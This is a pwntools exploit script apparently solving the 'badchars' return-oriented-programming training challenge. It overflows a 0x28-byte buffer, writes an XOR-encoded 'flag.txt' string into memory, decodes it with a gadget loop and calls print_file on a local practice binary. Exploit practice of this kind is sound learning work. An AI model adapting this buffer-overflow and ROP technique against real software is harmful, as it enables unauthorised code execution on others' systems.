from pwn import *

# file information here

context.arch = 'x86_64'
executable = 'badchars'
badbytes = 0x2e616778
gdbinit = '''
    b *pwnme+0x10c
    b *usefulGadgets
''' 
    

elf = ELF(executable)
libc = elf.libc
rop = ROP([elf, libc])

p = process(elf.path)
# gdb.attach(p, gdbscript=gdbinit)

# p.recvuntil("")

# THE ROP CHAIN

flagLocation = 0x601028+8

rop.raw(0x000000000040069c)
rop.raw('dnce,vzv')
rop.raw(flagLocation)
rop.raw(0)
rop.raw(0)
rop.raw(0x400634)
rop.raw(0x00000000004006a0)
rop.raw(0x2)
rop.raw(flagLocation)

for i in range(len('flag.txt')):
    rop.raw(0x4006a2)
    rop.raw(flagLocation+i)
    rop.usefulGadgets()
    
rop.print_file(flagLocation)

log.info(rop.dump())

payload = flat(
    b'a' * 0x28,
    rop.chain()    
)

# PWN
# pause()
# p.sendlineafter()
# p.recvuntil()
p.send(payload)

p.interactive()

# with open('out.txt', 'wb') as out:
    # out.write(payload)
